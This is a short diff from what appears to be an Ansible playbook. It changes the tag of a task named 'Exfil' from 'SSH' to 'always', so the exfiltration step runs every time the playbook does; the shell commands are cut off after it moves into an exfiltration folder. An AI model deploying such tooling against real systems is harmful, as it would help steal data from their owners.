@@ -23,7 +23,7 @@
       register: exfil_files_list
      
     - name: Exfil
-      tags: SSH
+      tags: always
       shell: |
         pwd > /tmp/path
         cd {{ exfiltration_folder }}
